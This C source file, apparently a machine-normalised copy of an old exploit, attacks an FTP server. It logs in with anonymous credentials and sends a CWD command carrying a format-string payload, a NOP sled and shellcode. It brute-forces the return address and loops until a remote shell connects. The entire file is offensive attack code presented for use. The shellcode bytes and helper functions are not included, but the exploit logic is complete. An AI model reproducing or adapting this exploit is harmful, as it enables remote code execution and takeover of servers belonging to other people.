#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int u_short ;
typedef  int u_long ;
typedef  int u_int ;
struct TYPE_2__ {int written; int align; int retaddr; char* name; char* code; void* retloc; void* stackpops; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int BUFSIZE ; 
 char* ELITEBANNER ; 
 int EOF ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  answer (char*,int,int /*<<< orphan*/ *) ; 
 void* atoi (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect_to_host (int,int) ; 
 int /*<<< orphan*/  die (char*) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fdopen (int,char*) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ *,char*,...) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 char* mk_fmt_string (int,void*,void*,int,int) ; 
 int /*<<< orphan*/  optarg ; 
 int res (char*) ; 
 int shell (int) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/ * stderr ; 
 char* strdup (int /*<<< orphan*/ ) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/ * strstr (char*,char*) ; 
 void* strtoul (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 TYPE_1__* tg ; 
 int /*<<< orphan*/  usage (char*) ; 
 scalar_t__ xmalloc (int) ; 

int main(int argc, char *argv[])
{
	u_long 	ip, brute = 0x0 ;
	u_short port = 21 ;

	char * user 	= "ftp";
	char * pass 	= "ftp@";
	char * victim 	= "127.0.0.1";

	int 	opt, len, sock, t = 0 ;

	char 	buf[ BUFSIZE ],
		nopcode[ BUFSIZE ];

	char * 	evil = (char *)xmalloc( 10000 );
	FILE * 	sockf = NULL ;

	fprintf( stderr, ELITEBANNER );
	if ( argc < 2 ) { usage( argv[0] ); exit(-1); }

        while ((opt = getopt(argc, argv, "b:u:p:w:g:P:n:a:r:hv:t:")) != EOF) {
                switch(opt)
                {
			case 'b': brute = strtoul(optarg,NULL,16); break;
			case 't': t = atoi(optarg); break;
			case 'v': victim = strdup( optarg ); break;
			case 'u': user = strdup( optarg ); break;
			case 'p': pass = strdup( optarg ); break;
                        case 'w': tg[t].written = atoi(optarg); break;
                        case 'g': tg[t].retloc = strtoul(optarg,NULL,16); break;
                        case 'P': port = atoi(optarg); break;
                        case 'n': tg[t].stackpops = atoi(optarg); break;
                        case 'a': tg[t].align = atoi(optarg); break ;
                        case 'r': tg[t].retaddr = strtoul(optarg,NULL,16); break;
                        case 'h':
                        default : usage( argv[0] ); exit( -1 ); break ;
                }
        }

	fprintf( stderr, "[+] Using target %s\n", tg[ t ].name ); 

	if ( (ip = res( victim )) == -1 )	
		die( "Bad hostname or ip." );
 
	do {
		if ( (sock = connect_to_host( ip, port )) > 0 ) {
			sockf = fdopen ( sock, "a+" );
			if ( fdopen == NULL ) die( "fdopen failed." );
		}
		else die( "Cannot connect to host." );

		fprintf( stderr, "[+] Trying to log in...\n");

        	answer( buf, BUFSIZE, sockf );
		fprintf( sockf, "USER %s\r\n", user);
        	answer( buf, BUFSIZE, sockf );
		fprintf( sockf, "PASS %s\r\n", pass);
        	answer( buf, BUFSIZE, sockf );

		if ( strstr( buf, "logged in" ) == NULL )
			die( "Cannot log in, wrong user/pwd ?" );
		else 
			fprintf( stderr, "[+] Doing the actual exploit...\n");

		fprintf( sockf, "CWD /\r\n" );
		answer( buf, BUFSIZE, sockf );

		fprintf( sockf, "CWD " );

		evil = mk_fmt_string( 	tg[ t ].align,				
                       	      		tg[ t ].stackpops,
			      		tg[ t ].retloc, 
                              		brute ? brute : tg[ t ].retaddr,
                              		tg[ t ].written
		);
		/*
 	 	 * I think shellcode can be placed elsewhere but I didn't check it
		 */
		len = 256 - strlen( "CWD " ) - strlen( tg[t].code ) - strlen( evil ) - 4;
		memset( nopcode, NOP, len );	
		nopcode[ len ] = 0 ;
		/*
	 	 * length of command line can't be more than 256 chars 
	 	 * because server checks it.. 
		 */
		fprintf( stderr, "[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\n", 
		tg[t].written, tg[t].align, brute ? (u_int)brute : (u_int)tg[t].retaddr, (u_int)tg[t].retloc, len );

		fprintf( sockf, "%s", evil );
		fprintf( sockf, "%s", nopcode );
		fprintf( sockf, "%s", tg[t].code );
		fprintf( sockf, "\r\n" );
		fprintf( sockf, "QUIT\r\n" );
		if ( brute ) brute -= len ;
		fclose( sockf );
		close( sock );
		sleep( 1 );
	}
	while (( shell( ip ) == -1 ) && ( brute > 0xbffff000 ));
		
	fprintf( stderr, "[-] Bye\n");
	return( 0xc1a0 );
}